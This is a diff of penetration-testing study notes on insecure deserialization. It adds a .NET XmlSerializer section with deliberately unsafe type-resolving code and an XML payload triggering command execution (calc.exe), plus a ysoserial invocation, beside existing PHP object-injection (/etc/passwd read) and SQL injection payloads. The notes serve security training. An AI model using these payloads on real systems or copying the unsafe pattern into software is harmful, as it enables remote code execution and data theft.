@@ -115,7 +115,7 @@ The PoC cookie value would be something like this:
 <@base64>O:9:"PageModel":1:{s:4:"file";s:33:"php://filter/resource=/etc/passwd";}<@/base64>
 ```
 
-## Custom PHP Object Injection  chain
+### Custom PHP Object Injection  chain
 
 Class code and gadgets:
 ```php
@@ -686,6 +686,88 @@ Deserialized data id: '\' UNION SELECT NULL, NULL, NULL, CAST(password AS numeri
 <p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;lpag2mjh4m8k3qvx87p2&quot;</p>
 ```
 
+## dotNET
+
+### XML Serialization
+
+>[!note] References
+>[XML serialization](https://learn.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization)
+>[XmlSerializer Class](https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=netframework-4.7.2)
+
+Serialization example:
+```dotnet
+static void MySerializer(MyConsoleText txt)
+{
+	var ser = new XmlSerializer(typeof(MyConsoleText));
+	TextWriter writer = new	StreamWriter("C:\\Users\\Public\\basicXML.txt");
+	ser.Serialize(writer, txt);
+	writer.Close();
+}
+
+public class MyConsoleText
+{
+	...
+}
+```
+
+Serialized object:
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<MyConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+<text>Hello AWAE</text>
+</MyConsoleText>
+```
+
+Deserialization example:
+```dotNET
+using BasicXMLSerializer;
+...
+static void Main(string[] args)
+{
+	var fileStream = new FileStream(args[0], FileMode.Open, FileAccess.Read);
+	var streamReader = new StreamReader(fileStream);
+	XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));
+	serializer.Deserialize(streamReader);
+}
+```
+
+>[!warning]
+>A developer could decide to make the custom deserializing wrapper a bit more flexible. This would provide the application with the ability to deserialize multiple types of objects. If that's the case and arbitrary objects can be passed to the server, deserialization of untrusted classes can be achieved.
+
+```dotnet
+// serializer
+xmlElement2.SetAttribute("objectType", myObj.GetType().AssemblyQualifiedName);
+XmlSerializer xmlSerializer = new XmlSerializer(myObj.GetType());
+
+// deserializer
+string typeName = xmlItem.GetAttribute("objectType");
+var xser = new XmlSerializer(Type.GetType(typeName));
+```
+
+Serialized object:
+```xml
+<customRootNode>
+<item objectType="MultiXMLSerializer.MyFirstConsoleText, MultiXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
+<MyFirstConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+<text>Serializing first class...</text>
+</MyFirstConsoleText>
+</item>
+</customRootNode>
+```
+
+Exploit (an `ExecCMD` is defined as well inside the server source code and uses a `cmd` variable string to execute arbitrary commands):
+```xml
+<customRootNode>
+<item objectType="MultiXMLDeserializer.ExecCMD, MultiXMLDeserializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
+<ExecCMD xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+<cmd>calc.exe</cmd>
+</ExecCMD>
+</item>
+</customRootNode>
+```
+
+Further references:
+- [DotNetNuke Cookie Deserialization Remote Code Execution (RCE) - CVE-2017-9822](https://github.com/murataydemir/CVE-2017-9822)
 
 ## YAML
 
@@ -755,9 +837,20 @@ To identify and construct gadget chains, **source code must be available** or, a
 Useful tools are:
 - [ysoserial](https://github.com/frohoff/ysoserial)
 	- The `URLDNS` chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in any known Java version. 
-	- `JRMPClient` is another universal chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. 
+	- `JRMPClient` is another universal chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address.
 - [phpgcc](https://github.com/ambionics/phpggc)
 - Existing writeups with known chains
+
+>[!tip] ysoserial in Java 16+
+>In Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial:
+>```bash
+java -jar ysoserial-all.jar \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+   --add-opens=java.base/java.net=ALL-UNNAMED \
+   --add-opens=java.base/java.util=ALL-UNNAMED \
+   [payload] '[command]'
+>```
 
 ## Creating your own exploit
 
